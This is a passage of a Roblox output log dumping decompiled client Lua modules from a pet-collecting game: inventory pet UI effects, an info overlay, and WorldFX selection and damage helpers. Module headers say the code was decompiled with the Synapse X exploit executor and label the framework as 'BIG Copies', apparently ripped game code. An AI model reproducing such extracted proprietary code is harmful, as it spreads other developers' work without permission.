			if u13 and os.clock() - v11 >= 0.1 then
				v11 = os.clock();
				Clone_ret.TextTransparency = v10 and 0.5 or 0;
				v10 = not v10;
			end
			debug.profileend();
			if u13 and FindFirstAncestorWhichIsA_ret2.Enabled then
				RunService.RenderStepped:Wait();
			else
				wait(0.5);
			end
		end
		if Clone_ret then
			Clone_ret:Destroy();
		end
	end);
	coroutine_wrap_ret3();
	local function UpdateVisual() -- Line: 580
		--[[
			Upvalues:
				[1] = p4
				[2] = p5
				[3] = u12
				[4] = u11
				[5] = t_hc2
				[6] = u10
				[7] = t_isGift2
				[8] = t_s
				[9] = bool6
				[10] = bool7
				[11] = bool8
				[12] = m_Functions
		--]]
		debug.profilebegin("PetUI.Create.UpdateVisual");
		p4.Name = p5;
		p4.PetIcon.Image = u12;
		p4.RarityGradient.Visible = not u11.huge and not u11.titanic;
		if t_hc2 and u10 then
			p4.PetIcon.ImageColor3 = Color3.fromRGB(42, 252, 255);
		else
			p4.PetIcon.ImageColor3 = Color3.new(1, 1, 1);
		end
		if u11.colorVariants and u18.cv then
			local v91 = u11.colorVariants[u18.cv];
			if v91 then
				p4.PetIcon.ImageColor3 = v91.Color;
			end;
		end;
		local v92 = nil;
		if u18.vc then
			v92 = Vector3.new(table.unpack(u18.vc));
		elseif u11.vertexColor then
			v92 = u11.vertexColor;
		end;
		if v92 then
			p4.PetIcon.ImageColor3 = prepareColor(v92);
		end;
		local Level = p4:FindFirstChild("Level");
		if Level then
			if t_isGift2 then
				Level.Visible = false;
			elseif t_s then
				if bool6 then
					Level.Text = "????";
				elseif bool7 then
					Level.Text = "???";
				elseif bool8 then
					Level.Text = "??";
				else
					Level.Text = m_Functions.NumberShorten(t_s);
				end
			end
		end
		if t_hc2 then
			p4.HC.Visible = true;
		end
		debug.profileend();
	end
	UpdateVisual();
	local function RefreshPetData() -- Line: 618
		--[[
			Upvalues:
				[1] = p6
				[2] = m_PetCmds
				[3] = p5
				[4] = u18
				[5] = u19
				[6] = m_Save
				[7] = u7
				[8] = m_Shared
				[9] = t_s
				[10] = t_idt
				[11] = u8
				[12] = u9
				[13] = u10
				[14] = t_l
				[15] = t_hc2
				[16] = t_powers2
				[17] = u12
				[18] = u11
				[19] = UpdateVisual
		--]]
		debug.profilebegin("PetUI.Create.RefreshPetData");
		if not p6 then
			local v14, v15 = m_PetCmds.Get(p5);
			if v14 and v15 then
				u18 = v14;
				u19 = v15;
				local v23 = m_Save.Get(u19);
				u7 = v23 and m_Shared.HasPetEquipped(v23, u18);
				t_s = u18.s;
				t_idt = u18.idt;
				local t_g2 = u18.g;
				local t_r2 = u18.r;
				local t_dm2 = u18.dm;
				u8 = t_g2;
				u9 = t_r2;
				u10 = t_dm2;
				t_l = u18.l;
				t_hc2 = u18.hc;
				t_powers2 = u18.powers;
				u12 = u10 and u11.darkMatterThumbnail or u8 and u11.goldenThumbnail or u11.thumbnail;
				UpdateVisual();
			end
		end
		debug.profileend();
	end
	local UIStroke = nil;
	local Clone_ret2 = nil;
	if not t_isGift2 then
		if t_rarity2 == "Legendary" or t_rarity2 == "Mythical" or t_rarity2 == "Secret" or t_rarity2 == "Event" or t_rarity2 == "Exclusive" then
			local Clone_ret3 = Assets.UI.Raritys:FindFirstChild(t_rarity2):Clone();
			Clone_ret3.Parent = p4.RarityGradient;
			p4.RarityGradient.Visible = not u11.huge and not u11.titanic;
			p4.BackgroundTransparency = 1;
			local Level2 = p4:FindFirstChild("Level");
			if Level2 then
				UIStroke = Level2:FindFirstChildOfClass("UIStroke");
				UIStroke.Color = Color3.new(1, 1, 1);
				Clone_ret2 = Clone_ret3:Clone();
				Clone_ret2.Parent = UIStroke;
			end
			local coroutine_wrap_ret4 = coroutine.wrap(function() -- Line: 655
				--[[
					Upvalues:
						[1] = FindFirstAncestorWhichIsA_ret2
						[2] = p4
						[3] = u13
						[4] = Clone_ret3
						[5] = Clone_ret2
						[6] = RunService
				--]]
				while not FindFirstAncestorWhichIsA_ret2 do
					wait(0.5);
				end
				while p4 and p4.Parent do
					if FindFirstAncestorWhichIsA_ret2.Enabled and u13 then
						local v29 = os.clock() * 60;
						Clone_ret3.Rotation = v29;
						if Clone_ret2 then
							Clone_ret2.Rotation = v29;
						end
					end
					if u13 and FindFirstAncestorWhichIsA_ret2.Enabled then
						RunService.RenderStepped:Wait();
					else
						wait(0.5);
					end
				end
			end);
			coroutine_wrap_ret4();
		else
			p4.RarityGradient.Visible = false;
		end
	end
	if t_isGift2 then
		local Clone_ret8 = Assets.UI.Inventory.GiftboxIcon:Clone();
		Clone_ret8.Parent = p4;
		p4.BackgroundColor3 = Color3.fromRGB(240, 107, 252);
	end
	local v4 = table2[t_rarity2];
	if v4 and not t_l then
		for index1 = 1, v4 do
			local Clone_ret7 = Assets.UI.Inventory.Star:Clone();
			if t_rarity2 == "Mythical" or t_rarity2 == "Secret" or t_rarity2 == "Event" then
				Clone_ret7.Image = "rbxassetid://12370956807";
			elseif t_rarity2 == "Exclusive" then
				Clone_ret7.Image = "rbxassetid://12371216119";
			end
			if u11.titanic then
				Clone_ret7.Image = "rbxassetid://12378209702";
			end
			Clone_ret7.Parent = p4.Stars;
		end
		p4.Stars.Visible = true;
		p4.Locked.Visible = false;
	end
	if t_l then
		p4.Stars.Visible = false;
		p4.Locked.Visible = true;
	end
	if u9 then
		local coroutine_wrap_ret8 = coroutine.wrap(function() -- Line: 717
			--[[
				Upvalues:
					[1] = FindFirstAncestorWhichIsA_ret2
					[2] = p4
					[3] = u9
					[4] = u13
					[5] = Color3_fromHSV_ret
					[6] = RunService
			--]]
			while not FindFirstAncestorWhichIsA_ret2 do
				wait(0.5);
			end
			while p4 and p4.Parent and u9 do
				if u13 and FindFirstAncestorWhichIsA_ret2.Enabled and p4.PetIcon.ImageColor3 ~= Color3.new(0, 0, 0) then
					p4.PetIcon.ImageColor3 = Color3_fromHSV_ret;
				end
				if u13 and FindFirstAncestorWhichIsA_ret2.Enabled then
					RunService.RenderStepped:Wait();
				else
					wait(0.5);
				end
			end
		end);
		coroutine_wrap_ret8();
	end
	if t_rarity2 == "Mythical" or t_rarity2 == "Secret" or t_rarity2 == "Event" or t_rarity2 == "Exclusive" then
		local function Sparkle() -- Line: 737
			--[[
				Upvalues:
					[1] = Assets
					[2] = Random_new_ret
					[3] = p4
					[4] = m_Functions
			--]]
			debug.profilebegin("PetUI.Create.Sparkle");
			local Clone_ret6 = Assets.UI.Inventory.Sparkle:Clone();
			Clone_ret6.Position = UDim2.new(Random_new_ret:NextNumber(), 0, Random_new_ret:NextNumber(), 0);
			Clone_ret6.Size = UDim2.new(0, 0, 0, 0);
			Clone_ret6.Parent = p4;
			local NextNumber_ret2 = Random_new_ret:NextNumber(0.2, 0.35);
			m_Functions.Tween(Clone_ret6, {Size = UDim2.new(NextNumber_ret2, 0, NextNumber_ret2, 0)}, table.pack(Random_new_ret:NextNumber(1.5, 2.75), "Quad", "Out")).Completed:Connect(function() -- Line: 747
				--[[
					Upvalues:
						[1] = m_Functions
						[2] = Clone_ret6
						[3] = Random_new_ret
				--]]
				m_Functions.Tween(Clone_ret6, {Size = UDim2.new(0, 0, 0, 0)}, table.pack(Random_new_ret:NextNumber(0.75, 1.25), "Sine", "InOut")).Completed:Wait();
				Clone_ret6:Destroy();
			end);
			debug.profileend();
		end
		local coroutine_wrap_ret7 = coroutine.wrap(function() -- Line: 755
			--[[
				Upvalues:
					[1] = FindFirstAncestorWhichIsA_ret2
					[2] = p4
					[3] = u13
					[4] = Sparkle
					[5] = Random_new_ret
			--]]
			while not FindFirstAncestorWhichIsA_ret2 do
				wait(0.5);
			end
			while p4 and p4.Parent do
				if u13 and FindFirstAncestorWhichIsA_ret2.Enabled then
					Sparkle();
				end
				wait(Random_new_ret:NextNumber(1, 2.5));
			end
		end);
		coroutine_wrap_ret7();
	end
	if t_sh2 then
		local Clone_ret4 = Assets.UI.Inventory.ShinePulse:Clone();
		Clone_ret4.Parent = p4;
		local coroutine_wrap_ret5 = coroutine.wrap(function() -- Line: 845
			--[[
				Upvalues:
					[1] = FindFirstAncestorWhichIsA_ret2
					[2] = p4
					[3] = Random_new_ret
					[4] = u13
					[5] = Clone_ret4
					[6] = m_Functions
					[7] = RunService
			--]]
			while not FindFirstAncestorWhichIsA_ret2 do
				wait(0.5);
			end
			while p4 and p4.Parent do
				local NextNumber_ret = Random_new_ret:NextNumber(0.5, 1);
				local _ = Random_new_ret:NextNumber(0.5, 1);
				if u13 and FindFirstAncestorWhichIsA_ret2.Enabled and Clone_ret4.ShineImage then
					m_Functions.Tween(Clone_ret4.ShineImage, {Size = UDim2.new(1.7, 0, 1.7, 0)}, table.pack(NextNumber_ret, "Linear", "Out")).Completed:Wait();
					if Clone_ret4:FindFirstChild("ShineImage") then
						m_Functions.Tween(Clone_ret4.ShineImage, {Size = UDim2.new(1.05, 0, 1.05, 0)}, table.pack(NextNumber_ret, "Linear", "Out")).Completed:Wait();
					end
				else
					RunService.RenderStepped:Wait();
				end
			end
		end);
		coroutine_wrap_ret5();
		local function Shine() -- Line: 868
			--[[
				Upvalues:
					[1] = Assets
					[2] = p4
					[3] = m_Functions
			--]]
			debug.profilebegin("PetUI.Create.Shine");
			local Clone_ret5 = Assets.UI.Inventory.Shine:Clone();
			Clone_ret5.Position = UDim2.new(0.5, 0, 0.5, 0);
			Clone_ret5.Parent = p4;
			local t_ShineImage = Clone_ret5.ShineImage;
			m_Functions.Tween(t_ShineImage, {Position = UDim2.new(1.2, 0, 1.2, 0)}, table.pack(0.75, "Linear", "Out")).Completed:Connect(function() -- Line: 878
				--[[
					Upvalues:
						[1] = Clone_ret5
				--]]
				Clone_ret5:Destroy();
			end);
			debug.profileend();
		end
		local coroutine_wrap_ret6 = coroutine.wrap(function() -- Line: 885
			--[[
				Upvalues:
					[1] = FindFirstAncestorWhichIsA_ret2
					[2] = p4
					[3] = u13
					[4] = Shine
					[5] = Random_new_ret
			--]]
			while not FindFirstAncestorWhichIsA_ret2 do
				wait(0.5);
			end
			while p4 and p4.Parent do
				if u13 and FindFirstAncestorWhichIsA_ret2.Enabled then
					Shine();
				end
				wait(Random_new_ret:NextNumber(0.5, 3));
			end
		end);
		coroutine_wrap_ret6();
	end
	local function ToggleEquipped(p9) -- Line: 901
		--[[
			Upvalues:
				[1] = p4
				[2] = m_Functions
				[3] = UIStroke
				[4] = Clone_ret2
		--]]
		debug.profilebegin("PetUI.Create.ToggleEquipped");
		p4.BackgroundColor3 = p9 and Color3.fromRGB(69, 239, 69) or Color3.fromRGB(59, 177, 252);
		if p9 then
			p4.Equipped.Size = UDim2.new(1, 0, 1, 0);
			m_Functions.Tween(p4.Equipped, {Size = UDim2.new(0.4, 0, 0.4, 0)}, table.pack(0.25, "Back", "Out"));
		end
		local UIGradient = p4.RarityGradient:FindFirstChildOfClass("UIGradient");
		if UIGradient then
			UIGradient.Enabled = not p9;
			p4.RarityGradient.ImageColor3 = p9 and Color3.fromRGB(69, 239, 69) or Color3.new(1, 1, 1);
		end
		if UIStroke then
			if Clone_ret2 then
				Clone_ret2.Enabled = not p9;
			end
			UIStroke.Color = p9 and Color3.fromRGB(19, 48, 57) or Clone_ret2 and Color3.new(1, 1, 1) or Color3.fromRGB(19, 48, 57);
		end
		debug.profileend();
	end
	local function ShowOverlay()  
		debug.profilebegin("PetUI.Create.ShowOverlay");
		if not u18 then
			debug.profileend();
			return;
		end
		RefreshPetData();
		if not u18 then
			debug.profileend();
			return;
		end
		local table5 = {{
			"Title",
			u11.name,
			t_rarity2
		}};
		if not t_isGift2 then
			table.insert(table5, {
				"Nickname",
				'"' .. (u18.nk or "???") .. '"',
				u18.snk
			});
		end
		if t_hc2 then
			table.insert(table5, {
				"Block",
				"Hardcore",
				"Hardcore"
			});
		end
		table.insert(table5, {
			"Rarity",
			t_rarity2
		});
		if u10 then
			table.insert(table5, {
				"Block",
				"Dark Matter",
				"Dark Matter"
			});
		elseif u9 then
			table.insert(table5, {
				"Block",
				"Rainbow",
				"Rainbow"
			});
		elseif u8 then
			table.insert(table5, {
				"Block",
				"Golden",
				"Golden"
			});
		end
		if t_sh2 then
			table.insert(table5, {
				"Block",
				"Shiny",
				"Shiny"
			});
		end
		local world = m_Shared.IsHardcore and v3.Hardcore.World or v3.World
		if world == "Yeet" then
			local v642 = m_PetCmds.GetEquipped(t_LocalPlayer) 
			local pwr = m_Shared.GetYeetPower(u18, v642)
			if pwr >= 0 then 
				table.insert(table5, {"YeetPower", m_Functions.NumberShorten(pwr)})
			end
		end	
		local rep = u18.rep
		if u11.replacements and rep then
			if #rep > 0 then
				for i,v in ipairs(rep) do
					table.insert(table5, {"Replacement", u18.id, v})
				end
			end
		end
		local cv = u18.cv
		if u11.colorReplacements and cv then
			table.insert(table5, {"ColorVariant", u18.id, cv})
		end
		if t_powers2 and #t_powers2 > 0 then
			for _, val6 in ipairs(t_powers2) do
				local unpack_ret1_2, unpack_ret2_2 = unpack(val6);
				local v24, v25 = m_Shared.GetPowerDir(unpack_ret1_2, unpack_ret2_2);
				assert(v24 and v25);
				table.insert(table5, {
					"Power",
					v24.title,
					v24.desc,
					v25.isUnique
				});
			end
		end

		local t_merchData2 = u18.merchData;
		local t_serialData2 = u18.serialData;
		if m_Shared.ShowPetExists(u18) then
			local v16 = m_Save.Get();
			assert(v16);
			local GetPetsInExistence_ret1_2, GetPetsInExistence_ret2_2 = GetPetsInExistence(t_id2);
			if GetPetsInExistence_ret1_2 and GetPetsInExistence_ret2_2 then
				local v26 = GetPetsInExistence_ret1_2 < 100000 and m_Functions.Commas(GetPetsInExistence_ret1_2) or m_Functions.NumberShorten(GetPetsInExistence_ret1_2);
				table.insert(table5, {
					"Rare",
					v26 .. " Exist"
				});
			end
		end
		if t_merchData2 then
			table.insert(table5, {
				"MerchSerial",
				t_merchData2.serial or 0
			});
			table.insert(table5, {
				"MerchPlayer",
				t_merchData2.user or -1
			});
		elseif t_serialData2 then
			table.insert(table5, {
				"MerchSerial",
				t_serialData2.serial or 0
			});
			table.insert(table5, {
				"MerchPlayer",
				t_serialData2.user or -1
			});
		end
		if u18.snk then
			table.insert(table5, {"Signed"});
		end
		if m_Settings.ShowPetDebug then
			table.insert(table5, {
				"Nickname",
				"PetID: " .. u18.id
			});
			table.insert(table5, {
				"debug_UID",
				u18.uid,
				p4
			});
		end
		if u11.tradeable and t_isGift2 then
			if u11.giftEggId then
				local v27 = m_Directory.Eggs[u11.giftEggId];
				table.insert(table5, {
					"Nickname",
					"Contains:"
				});
				table.insert(table5, {
					"GiftPetOdds",
					u11.giftEggId,
					v27.drops
				});
			end
			table.insert(table5, {
				"ClickToOpen",
				(m_Variables.Mobile and "Tap" or "Click") .. " to open"
			});
			if u11.tradeable then
				table.insert(table5, {"Tradeable"});
			end
		end
		if m_FFlags.Get(m_FFlags.Keys.RAP) or m_FFlags.CanBypass() then
			local v17 = m_RAPShared.CreateKey(u18);
			if v17 then
				table.insert(table5, {
					"RAP",
					v17
				});
			end
		end
		if m_FFlags.CanBypass() then
			local t_o2 = u18.o;
			if t_o2 then
				table.insert(table5, {
					"OpenedBy",
					t_o2[1],
					t_o2[2]
				});
			end
			local t_h2 = u18.h;
			if t_h2 then
				table.insert(table5, {
					"OwnerCount",
					t_h2.n
				});
				local v28 = t_h2.l[2];
				if v28 then
					table.insert(table5, {
						"LastOwner",
						v28[1],
						v28[2]
					});
				end
			end
		end
		m_InfoOverlay.Add(p4, unpack(table5));
		debug.profileend();
	end
	p4.MouseEnter:Connect(function() -- Line: 1064
		--[[
			Upvalues:
				[1] = m_Audio
				[2] = ShowOverlay
		--]]
		m_Audio.Play("rbxassetid://6907626084", script, 1, 0.2);
		ShowOverlay();
	end);
	p4.SelectionGained:Connect(function() -- Line: 1069
		--[[
			Upvalues:
				[1] = m_Audio
				[2] = ShowOverlay
		--]]
		m_Audio.Play("rbxassetid://6907626084", script, 1, 0.2);
		ShowOverlay();
	end);
	if not t_isGift2 then
		p4.Equipped:GetPropertyChangedSignal("Visible"):Connect(function() -- Line: 1075
			--[[
				Upvalues:
					[1] = p4
					[2] = ToggleEquipped
			--]]
			ToggleEquipped(p4.Equipped.Visible);
		end);
	end
	debug.profileend();
end
function GetPetsInExistence(p7) -- Line: 1088
	--[[
		Upvalues:
			[1] = u1
	--]]
	if not u1 then
		return nil, nil;
	end
	--if u1.pets[p7] then
	--	local t_am = u1.pets[p7].am;
	--	return t_am, u1.total;
    --end
    if u1[p7] then
        return u1[p7], u1[p7]
    end
	return nil, nil;
end
function UpdatePetDB() -- Line: 1104
	--[[
		Upvalues:
			[1] = m_Network
			[2] = u1
	--]]
	local v5 = m_Network.Invoke("Get Pet Rarity DB");
	if v5 then
		u1 = v5;
	end
end
local coroutine_wrap_ret9 = coroutine.wrap(function() -- Line: 1114
	--[[
		Upvalues:
			[1] = u1
	--]]
	while not u1 do
		UpdatePetDB();
		wait(1);
	end
	while true do
		task.wait(30);
		UpdatePetDB();
	end
end);
coroutine_wrap_ret9();
local u3 = 0;
game:GetService("RunService").RenderStepped:Connect(function(p8) -- Line: 1127
	--[[
		Upvalues:
			[1] = u3
			[2] = Color3_fromHSV_ret
			[3] = u2
	--]]
	u3 = u3 + p8;
	Color3_fromHSV_ret = Color3.fromHSV(u3 / 2 % 1, 1, 1);
	u2 = math.sin(u3 * 4) * 0.2 + 0.7;
end);
return table1;
  -  Editar
  04:54:13.758    -  Editar
  04:54:13.758  ----- [2304] ReplicatedStorage.Library.Client.WorldFX -----  -  Editar
  04:54:13.758  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.WorldFX
	===========
	And in-house library of helpful WorldFX down to things that aren't already
	implemented natively by Roblox like ScaleModel. The WorldFX individually can be found as children under this module.
	===========
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-- | load library | --
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local ClientLibrary = Library:WaitForChild("Client")
local Modules = Library:WaitForChild("Modules")
local Types = Library:WaitForChild("Types")

-- | shared modules | --
local Network = require(ClientLibrary.Network)

--------|       Top       |--------
local WorldFX = {
	Selection = require(script.Selection),
	Damage = require(script.Damage),
	AddCurrency = require(script.AddCurrency),
	QuestGlow = require(script.QuestGlow),
	CoinSelection = require(script.CoinSelection),
	ModelFlash = require(script.ModelFlash),
	RewardBillboard = require(script.RewardBillboard),
	RewardImage = require(script.RewardImage),
	PetSpawn = require(script.PetSpawn),
	Explosion = require(script.Explosion),
	CometDespawn = require(script.CometDespawn)
}

--------|     Setting     |--------

--------|    Reference    |--------

--------|    Variables    |--------
local unaddedEntries = ""

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

for _, module in ipairs(script:GetChildren()) do
	if module:IsA("ModuleScript") and WorldFX[module.Name] == nil then
		unaddedEntries = unaddedEntries .. string.format("%s = require(script.%s),\n", module.Name, module.Name)
	end	
end

if #unaddedEntries > 0 then
	warn(string.format("Unadded entries: \n\n%s\n", unaddedEntries))
end

for index, v in pairs(WorldFX) do
	if not script:FindFirstChild(index) then
		warn(string.format("Unknown entry: %s", tostring(index)))
	end	
end

for _, module in ipairs(script:GetChildren()) do
	if module:IsA("ModuleScript") and WorldFX[module.Name] == nil then
		WorldFX[module.Name] = require(module)
	end	
end

--
Network.Fired("RewardImage"):Connect(function(...)
	WorldFX.RewardImage(...)
end)
--


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

return WorldFX
  -  Editar
  04:54:13.759    -  Editar
  04:54:13.759  ----- [2305] ReplicatedStorage.Library.Client.WorldFX.Selection -----  -  Editar
  04:54:13.759  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
local _ = require(Library.Functions);
return function(p1, p2, p3) -- Line: 34
	--[[
		Upvalues:
			[1] = Assets
			[2] = __DEBRIS
			[3] = RunService
	--]]
	local u1 = p1:IsA("Model") and p1.PrimaryPart or p1;
	local u2 = p2:IsA("Model") and p2.PrimaryPart or p2;
	if not u1 or not u2 then
		return function() -- Line: 43
		end;
	end
	local v1 = p3 or Color3.new(1, 1, 1);
	local bool1 = false;
	local Clone_ret = Assets.Other.Selection:FindFirstChild("DottedLine"):Clone();
	local Clone_ret2 = Assets.Other.Selection:FindFirstChild("SelectionCircle"):Clone();
	local Clone_ret3 = Assets.Other.Selection:FindFirstChild("SelectionCircle"):Clone();
	local Attachment = Clone_ret2:FindFirstChild("Attachment");
	local Attachment2 = Clone_ret3:FindFirstChild("Attachment");
	Clone_ret.Attachment0 = Attachment;
	Clone_ret.Attachment1 = Attachment2;
	Clone_ret.Color = ColorSequence.new(v1);
	Clone_ret2.Decal.Color3 = v1;
	Clone_ret3.Decal.Color3 = v1;
	local math_max_ret = math.max(u1.Size.X, u1.Size.Z);
	local math_max_ret2 = math.max(u2.Size.X, u2.Size.Z);
	Clone_ret2.Size = Vector3.new(math_max_ret + 2, 0.05, math_max_ret + 2);
	Clone_ret3.Size = Vector3.new(math_max_ret2 + 2, 0.05, math_max_ret2 + 2);
	Attachment.Position = Vector3.new(0, 0, -Clone_ret2.Size.Z / 2);
	Attachment2.Position = Vector3.new(0, 0, -Clone_ret3.Size.Z / 2);
	Clone_ret.Parent = Clone_ret2;
	Clone_ret2.Parent = __DEBRIS;
	Clone_ret3.Parent = __DEBRIS;
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 77
		--[[
			Upvalues:
				[1] = bool1
				[2] = u1
				[3] = u2
				[4] = Clone_ret2
				[5] = Clone_ret3
				[6] = Clone_ret
				[7] = RunService
		--]]
		while not bool1 and u1.Parent and u2.Parent and Clone_ret2.Parent and Clone_ret3.Parent and Clone_ret.Parent do
			local __MAP = workspace:WaitForChild("__MAP");
			for index1 = 1, 2 do
				local v4 = index1 == 1 and u1 or u2;
				local v5 = index1 == 1 and Clone_ret2 or Clone_ret3;
				local Ray_new_ret = Ray.new(v4.CFrame.Position, Vector3.new(0, -1, 0).Unit * 300);
				local FindPartOnRayWithWhitelist_ret1, FindPartOnRayWithWhitelist_ret2, _ = workspace:FindPartOnRayWithWhitelist(Ray_new_ret, {__MAP});
				if FindPartOnRayWithWhitelist_ret1 and FindPartOnRayWithWhitelist_ret2 then
					v5.CFrame = CFrame.new(v4.Position.X, FindPartOnRayWithWhitelist_ret2.Y + 0, v4.Position.Z);
				end
			end
			local cf = CFrame.new(Clone_ret2.CFrame.Position, Clone_ret3.CFrame.Position);
			local cf2 = CFrame.new(Clone_ret3.CFrame.Position, Clone_ret2.CFrame.Position);
			local table1 = {cf:ToOrientation()};
			local table2 = {cf2:ToOrientation()};
			local v2 = CFrame.new(cf.Position) * CFrame.fromOrientation(0, table1[2], 0);
			local v3 = CFrame.new(cf2.Position) * CFrame.fromOrientation(0, table2[2], 0);
			Clone_ret2.CFrame = v2;
			Clone_ret3.CFrame = v3;
			RunService.RenderStepped:Wait();
		end
		Clone_ret2:Destroy();
		Clone_ret3:Destroy();
	end);
	coroutine_wrap_ret();
	return function() -- Line: 122
		--[[
			Upvalues:
				[1] = bool1
		--]]
		bool1 = true;
	end;
end;
  -  Editar
  04:54:13.759    -  Editar
  04:54:13.759  ----- [2306] ReplicatedStorage.Library.Client.WorldFX.Damage -----  -  Editar
  04:54:13.759  -- Decompiled with Synapse X v3.0 | https://github.com/synllc

local ReplicatedStorage = game:GetService("ReplicatedStorage");
local RunService = game:GetService("RunService");
local Library = ReplicatedStorage:WaitForChild("Library");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local __DEBRIS = workspace:WaitForChild("__DEBRIS");
local m_Functions = require(Library.Functions);
local Random_new_ret = Random.new();
return function(p1, p2, p3) -- Line: 36
	--[[
		Upvalues:
			[1] = __DEBRIS
			[2] = Assets
			[3] = m_Functions
			[4] = Random_new_ret
			[5] = RunService
	--]]
	local u1 = p3 == true;
	local v1 = p2 or 0;
	local RewardBillboard = Instance.new("Part");
	RewardBillboard.Anchored = true;
	RewardBillboard.CanCollide = false;
	RewardBillboard.Size = Vector3.new(0.05, 0.05, 0.05);
	RewardBillboard.CastShadow = false;
